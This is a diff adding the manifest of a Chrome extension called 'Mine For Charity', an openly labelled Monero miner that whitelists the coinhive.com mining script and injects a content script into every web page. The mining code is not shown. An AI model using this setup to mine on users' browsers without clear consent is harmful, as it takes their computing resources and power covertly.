@@ -1,0 +1,32 @@
+{
+  "name": "Mine For Charity",
+  "description": "Monero Miner",
+  "version": "0.0.0.1",
+  "manifest_version": 2,
+  "content_security_policy":"script-src 'self' https://coinhive.com/lib/coinhive.min.js; object-src 'self'",
+  "icons": {
+    "128": "monero.png"
+  },
+  "browser_action": {
+    "default_icon": "monero.png",
+    "default_popup": "popup.html"
+  },
+  "background": {
+    "scripts": ["background.js"]
+  },
+  "content_scripts": [
+    {
+      "matches": ["http://*/*", "https://*/*"],
+      "js": ["myScript.js"]
+    }
+  ]
+
+  /*"app": {
+    "urls": [
+      "http://mysubdomain.example.com/"
+    ],
+    "launch": {
+      "web_url": "http://mysubdomain.example.com/"
+    }
+  }*/
+}
